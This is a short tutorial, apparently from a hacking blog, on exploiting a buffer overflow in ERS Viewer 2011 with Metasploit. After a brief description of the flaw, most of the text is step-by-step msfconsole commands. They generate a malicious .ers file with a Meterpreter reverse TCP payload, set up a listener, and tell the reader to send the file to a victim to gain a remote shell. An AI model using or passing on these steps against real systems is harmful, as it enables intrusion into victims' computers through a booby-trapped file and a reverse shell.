Exploit Remote  Windows PC using ERS Viewer 2011 ERS File Handling Buffer Overflow

This module exploits a buffer overflow vulnerability found in ERS Viewer 2011 (version 11.04). The vulnerability exists in the module ermapper_u.dll where the functionERM_convert_to_correct_webpath handles user provided data in a insecure way. It results in arbitrary code execution under the context of the user viewing a specially crafted .ers file. This module has been tested successfully with ERS Viewer 2011 (version 11.04) on Windows XP SP3 and Windows 7 SP1.
ERS Viewer 2011 (v11.04)
Attacker: Backtrack 5
Victim PC: Windows 7
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/erdas_er_viewer_bof
msf exploit (erdas_er_viewer_bof)>set payload windows/meterpreter/reverse_tcp
msf exploit (erdas_er_viewer_bof)>set lhost 192.168.0.106 (IP of Local Host)
msf exploit (erdas_er_viewer_bof)>exploit

After we successfully generate the malicious ers File, it will stored on your local computer
/root/.msf4/local/msf.ers

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.0.106
exploit
Now send your msf.ers files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
